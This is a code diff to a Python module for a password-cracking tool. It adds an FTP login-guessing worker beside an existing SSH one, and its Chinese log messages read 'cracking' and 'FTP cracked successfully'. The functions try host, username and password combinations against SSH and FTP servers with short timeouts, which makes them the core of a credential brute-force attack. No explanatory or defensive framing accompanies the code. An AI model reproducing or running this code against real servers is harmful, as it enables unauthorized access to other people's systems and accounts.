@@ -13,6 +13,7 @@
  *
  """
 import paramiko
+from ftplib import FTP
 
 def sshWorker(host,username,password):
     """
@@ -24,9 +25,9 @@ def sshWorker(host,username,password):
     """
     ssh=paramiko.SSHClient()
     try:
-        print "正在破解【%s】【%s】【%s】" % (host,username,password)
+        #print "正在破解SSH【%s】【%s】【%s】" % (host,username,password)
         ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-        ssh.connect(hostname=host,username=username,password=password,timeout=0.5)
+        ssh.connect(hostname=host,username=username,password=password,timeout=1)
         return True
     except:
         #print traceback.format_exc()
@@ -34,3 +35,25 @@ def sshWorker(host,username,password):
         return False
     finally:
         ssh.close()
+
+def ftpWorker(host,username,password,port=21):
+    """
+    ftp连接
+    :param host:
+    :param username:
+    :param password:
+    :return:
+    """
+    ftp = FTP(host)
+    try:
+        print "正在破解FTP【%s】【%s】【%s】" % (host,username,password)
+        ftp.connect(host,port)  #连接 服务器名  端口号
+        ftp.login(username,password)
+        print "FTP破解成功"
+        return True
+    except:
+        #print traceback.format_exc()
+        # 有时候会爆session问题，登陆成功但没有获取session的情况，没有仔细研究过
+        return False
+    finally:
+        ftp.quit()
